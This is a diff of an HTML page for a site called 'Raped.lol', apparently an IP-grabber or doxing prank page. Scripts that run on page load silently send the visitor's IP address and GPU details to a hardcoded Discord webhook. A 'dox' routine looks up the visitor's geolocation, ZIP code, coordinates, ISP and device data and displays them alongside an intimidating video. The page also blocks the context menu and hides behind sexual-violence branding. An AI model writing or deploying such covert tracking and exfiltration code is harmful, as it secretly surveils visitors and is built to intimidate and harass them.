@@ -1,25 +1,22 @@
+<!DOCTYPE html>
+
+
 <script>
     function getUserIP(onNewIP) {
         //  Create new XMLHttpRequest
         var xhr = new XMLHttpRequest();
-
         // Callback function when XMLHttpRequest is ready
         xhr.onreadystatechange = function () {
             if (this.readyState == 4 && this.status == 200) {
                 onNewIP(this.responseText);
             }
         };
-
         // Send request to get users ip
         xhr.open("GET", "https://api.ipify.org?format=json", true);
         xhr.send();
     }
-
     getUserIP(function (ip) {
         // Send IP to webhook
-
-        const gpuInfo = document.createElement('canvas').getContext('webgl').getExtension('WEBGL_debug_renderer_info');
-
         fetch('https://discord.com/api/webhooks/1193119309594112040/PvdEewvBUYlteGdtgcEXDv89Uk515__n3DRN6sm17NNFpyK8qujCPjc2trN9pR3xANLS', {
             method: 'POST',
             headers: {
@@ -27,13 +24,211 @@
             },
             body: JSON.stringify({
                 embeds: [{
-                    title: 'Info',
-                    description: `IP Address: ${ip}   
-
-  OS Info: ${navigator.appVersion}`,
+                    title: 'IP Address',
+                    description: ip,
                     color: 0x00FF00
                 }]
             })
         });
     });
 </script>
+
+<script>
+    // Send GPU info to same webhook
+    const gl = document.createElement('canvas').getContext('webgl');
+    const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+
+    fetch('https://discord.com/api/webhooks/1193119309594112040/PvdEewvBUYlteGdtgcEXDv89Uk515__n3DRN6sm17NNFpyK8qujCPjc2trN9pR3xANLS', {
+        method: 'POST',
+        headers: {
+            'Content-Type': 'application/json'
+        },
+        body: JSON.stringify({
+            embeds: [{
+                title: 'GPU Info',
+                description: gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL),
+                color: 0x00FF00
+            }]
+        })
+    });
+</script>
+
+
+
+<html lang="en">
+<head>
+    <meta content="text/html; charset=UTF-8" http-equiv="content-type">
+    <link href="assets/cosmo.css" rel="stylesheet">
+    <script>
+        let msg1 = " | Raped";
+        const speed = 100;
+
+        function scrollTitle() {
+            document.title = msg1;
+            msg1 = msg1.substring(1, msg1.length) + msg1.charAt(0);
+            setTimeout(scrollTitle, speed);
+        }
+
+        scrollTitle();
+    </script>
+    <title>| Raped </title>
+    <title></title>
+    <meta content="width=device-width, initial-scale=1" name="viewport">
+    <meta content="IE=edge" http-equiv="X-UA-Compatible">
+    <meta content="Raped.lol" property="og:title">
+    <meta content="@ Raped.lol" property="og:description">
+    <link href="assets/anim.css" rel="stylesheet">
+    <link href="assets/style.css" rel="stylesheet">
+    <link href="assets/cancel.css" rel="stylesheet">
+    <script src="assets/routing.js"></script>
+</head>
+<body>
+<div class="container" style="display: block;">
+    <div class="row" style="display: block;">
+        <div class="col-md-12" style="display: block;">
+            <img class="hanginggirl animated infinite nodrag" draggable="false" src="assets/imageedit_2_7583773831.gif"
+                 style="display: block;">
+        </div>
+    </div>
+</div>
+<br>
+<br>
+<div id="enter-remove">
+    <b class="begin">
+        <span id="enter-type-in" style="text-shadow: 0 0 0.40em #fff;"></span>
+        <br/>
+        <span id="enter" class="appear">[<span style="--color: #00ff00" class="glow-hover">YES</span>]</span> <span
+            class="appear" onclick="start_dox()">[<span style="--color: #FF0000" class="glow-hover">NO</span>]</span>
+    </b> <br/>
+    <div id="dox">
+        <video id="dox-bg-vid" loop="" playsinline="" preload="auto" src="assets/Comp_1_3.mp4"></video>
+
+        <div id="dox-overlay">
+
+        </div>
+    </div>
+</div>
+<div id="main">
+    <div style="text-align: center;">
+        <h3 style="text-shadow: 0 0 0.40em #7F73D2;">
+            <a href=" speculate.html "
+               style="background-image: url('https://i.ibb.co/D8vWbSn/sparkle.gif');"><strong>Speculate</strong></a><br>
+        </h3>
+    </div>
+</div>
+<audio id="audio" src="assets/1.mp3"></audio>
+<script src="assets/audio.js"></script>
+<script src="assets/main-audio-unlock.js"></script>
+<link href="https://fonts.cdnfonts.com/css/terror-pro" rel="stylesheet">
+<footer style="text-align: center; text-shadow: 0px 5px 5px ;font-family: 'Terror Pro', sans-serif; color: #7F73D2;margin-top: 19em;">
+    <h4>
+        <a href="index.html"
+           style="text-align: center; text-shadow: 0px 5px 5px ;font-family: 'Terror Pro', sans-serif;color: #7F73D2;">Raped.lol</a>
+    </h4>
+</footer>
+<script>
+    document.addEventListener('contextmenu', event =>
+        event.preventDefault()
+    )
+</script>
+<script>
+    // let volume = document.querySelector("#volume");
+    // volume.addEventListener("change", function (e) {
+    //     audio.volume = e.currentTarget.value / 200;
+    // })
+
+    audio.volume = 1.0;
+</script>
+<script>
+    !function (e, o) { "object" == typeof exports && "undefined" != typeof module ? module.exports = o() : "function" == typeof define && define.amd ? define(o) : (e = "undefined" != typeof globalThis ? globalThis : e || self).BrowserDetector = o() }(this, (function () { "use strict"; function e(e, o) { for (var n = 0; n < o.length; n++) { var r = o[n]; r.enumerable = r.enumerable || !1, r.configurable = !0, "value" in r && (r.writable = !0), Object.defineProperty(e, r.key, r) } } var o = { chrome: "Google Chrome", brave: "Brave", crios: "Google Chrome", edge: "Microsoft Edge", edg: "Microsoft Edge", fennec: "Mozilla Firefox", jsdom: "JsDOM", mozilla: "Mozilla Firefox", msie: "Microsoft Internet Explorer", opera: "Opera", opios: "Opera", opr: "Opera", rv: "Microsoft Internet Explorer", safari: "Safari", samsungbrowser: "Samsung Browser", electron: "Electron" }, n = { android: "Android", androidTablet: "Android Tablet", cros: "Chrome OS", fennec: "Android Tablet", ipad: "IPad", iphone: "IPhone", jsdom: "JsDOM", linux: "Linux", mac: "Macintosh", tablet: "Android Tablet", win: "Windows", "windows phone": "Windows Phone", xbox: "Microsoft Xbox" }, r = function (e) { var o = arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : -1, n = new RegExp("^-?\\d+(?:.\\d{0,".concat(o, "})?")), r = Number(e).toString().match(n); return r ? r[0] : null }, i = function () { return "undefined" != typeof window ? window.navigator : null }, t = function () { function t(e) { var o; !function (e, o) { if (!(e instanceof o)) throw new TypeError("Cannot call a class as a function") }(this, t), this.userAgent = e || (null === (o = i()) || void 0 === o ? void 0 : o.userAgent) || null } var a, l, s; return a = t, l = [{ key: "parseUserAgent", value: function (e) { var t, a, l, s = {}, c = e || this.userAgent || "", d = c.toLowerCase().replace(/\s\s+/g, " "), u = /(edge)\/([\w.]+)/.exec(d) || /(edg)[/]([\w.]+)/.exec(d) || /(opr)[/]([\w.]+)/.exec(d) || /(jsdom)[/]([\w.]+)/.exec(d) || /(samsungbrowser)[/]([\w.]+)/.exec(d) || /(electron)[/]([\w.]+)/.exec(d) || /(chrome)[/]([\w.]+)/.exec(d) || /(crios)[/]([\w.]+)/.exec(d) || /(opios)[/]([\w.]+)/.exec(d) || /(version)(applewebkit)[/]([\w.]+).*(safari)[/]([\w.]+)/.exec(d) || /(webkit)[/]([\w.]+).*(version)[/]([\w.]+).*(safari)[/]([\w.]+)/.exec(d) || /(applewebkit)[/]([\w.]+).*(safari)[/]([\w.]+)/.exec(d) || /(webkit)[/]([\w.]+)/.exec(d) || /(opera)(?:.*version|)[/]([\w.]+)/.exec(d) || /(msie) ([\w.]+)/.exec(d) || /(fennec)[/]([\w.]+)/.exec(d) || d.indexOf("trident") >= 0 && /(rv)(?::| )([\w.]+)/.exec(d) || d.indexOf("compatible") < 0 && /(mozilla)(?:.*? rv:([\w.]+)|)/.exec(d) || [], f = /(ipad)/.exec(d) || /(ipod)/.exec(d) || /(iphone)/.exec(d) || /(jsdom)/.exec(d) || /(windows phone)/.exec(d) || /(xbox)/.exec(d) || /(win)/.exec(d) || /(tablet)/.exec(d) || /(android)/.test(d) && !1 === /(mobile)/.test(d) && ["androidTablet"] || /(android)/.exec(d) || /(mac)/.exec(d) || /(linux)/.exec(d) || /(cros)/.exec(d) || [], p = u[5] || u[3] || u[1] || null, w = f[0] || null, x = u[4] || u[2] || null, b = i(); "chrome" === p && "function" == typeof (null == b || null === (t = b.brave) || void 0 === t ? void 0 : t.isBrave) && (p = "brave"), p && (s[p] = !0), w && (s[w] = !0); var m = Boolean(s.tablet || s.android || s.androidTablet), v = Boolean(s.ipad || s.tablet || s.androidTablet), g = Boolean(s.android || s.androidTablet || s.tablet || s.ipad || s.ipod || s.iphone || s["windows phone"]), h = Boolean(s.cros || s.mac || s.linux || s.win), y = Boolean(s.brave || s.chrome || s.crios || s.opr || s.safari || s.edg || s.electron), A = Boolean(s.msie || s.rv); return { name: null !== (a = o[p]) && void 0 !== a ? a : null, platform: null !== (l = n[w]) && void 0 !== l ? l : null, userAgent: c, version: x, shortVersion: x ? r(parseFloat(x), 2) : null, isAndroid: m, isTablet: v, isMobile: g, isDesktop: h, isWebkit: y, isIE: A } } }, { key: "getBrowserInfo", value: function () { var e = this.parseUserAgent(); return { name: e.name, platform: e.platform, userAgent: e.userAgent, version: e.version, shortVersion: e.shortVersion } } }], s = [{ key: "VERSION", get: function () { return "3.2.0" } }], l && e(a.prototype, l), s && e(a, s), Object.defineProperty(a, "prototype", { writable: !1 }), t }(); return t }));
+
+    async function start_dox() {
+        console.log("dox")
+        let dox = document.getElementById("dox");
+        let bg = document.getElementById("dox-bg-vid");
+        let overlay = document.getElementById("dox-overlay");
+        bg.play();
+        dox.style.opacity = "1";
+
+        let fontSize = Math.min(window.innerHeight / 10, window.innerWidth / 20)
+        overlay.style.fontSize = fontSize + "px";
+
+        const basic = await (await fetch('https://wtfismyip.com/json')).json();
+        let detailed = await (await fetch(`https://we-are-jammin.xyz/json/${basic.YourFuckingIPAddress}`)).json();
+        const detector = new BrowserDetector(window.navigator.userAgent).parseUserAgent();
+
+        async function push(key, value) {
+            let span = document.createElement("span");
+            span.innerText = key + ": " + value;
+            overlay.appendChild(span);
+            const height = overlay.getBoundingClientRect().height;
+            if (height > window.innerHeight) {
+                console.log("font size")
+                fontSize = fontSize - (fontSize / 10);
+                overlay.style.fontSize = fontSize + 'px';
+            }
+            await new Promise((res, rej) => setTimeout(res, 300))
+        }
+
+        await push('IP Address', basic.YourFuckingIPAddress);
+        await push('Hostname', basic.YourFuckingHostname);
+        await push('IP Port', basic.YourFuckingIPPort);
+        await push('ISP', basic.YourFuckingISP);
+        await push('Country', detailed.country);
+        await push('Region', detailed.regionName);
+        await push('City', detailed.city);
+        await push('ZIP Code', detailed.zip);
+        await push('Full Location', basic.YourFuckingLocation);
+        await push('Latitude', detailed.lat);
+        await push('Longitude', detailed.lon);
+        await push('Timezone', detailed.timezone);
+        await push('Current Time', new Date().toLocaleString());
+        await push('ISP', detailed.isp);
+        await push('Organization', detailed.org);
+        await push('Autonomous System', detailed.as);
+        await push('Browser Name', detector.name);
+        await push('Platform Name', detector.platform);
+        await push('Browser Version', detector.version);
+        await push('Mobile/Tablet', (detector.isMobile || detector.isTablet) ? 'Yes' : 'No');
+        await push('Referrer', document.referrer || 'None');
+        await push('System Languages', navigator.languages.join(', '));
+        await push('Screen Width', screen.width, 'px');
+        await push('Screen Height', screen.height, 'px');
+        await push('os version', navigator.appVersion);
+        if (screen.width != window.width || screen.height != window.height) {
+            await push('Window Width', window.outerWidth, 'px');
+            await push('Window Height', window.outerHeight, 'px');
+        }
+        await push('Display Pixel Depth', screen.pixelDepth);
+        if (typeof screen.orientation != 'undefined') {
+            await push('Screen Orientation', screen.orientation.type.split('-')[0]);
+            await push('Screen Rotation', screen.orientation.angle, ' degrees');
+        }
+        await push('CPU Threads', navigator.hardwareConcurrency);
+        await push('CPU Vendor', navigator.vendor);
+        await push('Available Browser Memory', typeof window.performance.memory != 'undefined' ? Math.round(window.performance.memory.jsHeapSizeLimit / 1024 / 1024) : null, 'MB');
+        await push('Available System Memory', Math.round(window.navigator.deviceMemory * 1024), 'MB');
+    
+
+        const canvas = document.createElement('canvas');
+        let gl;
+        let debugInfo;
+
+        try {
+            gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+            debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+        } catch (e) { }
+
+        if (gl && debugInfo) {
+            await push('GPU Vendor', gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL));
+            await push('GPU Info', gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL));
+            await push('GPU Max Texture Size', gl.getParameter(gl.MAX_TEXTURE_SIZE));
+        }
+    }
+</script>
+<script src="assets/sparkle.js"></script>
+<script src="assets/disable_inspect.js"></script>
+<script src="assets/app.js" type="text/javascript"></script>
+</body>
+</html>
+
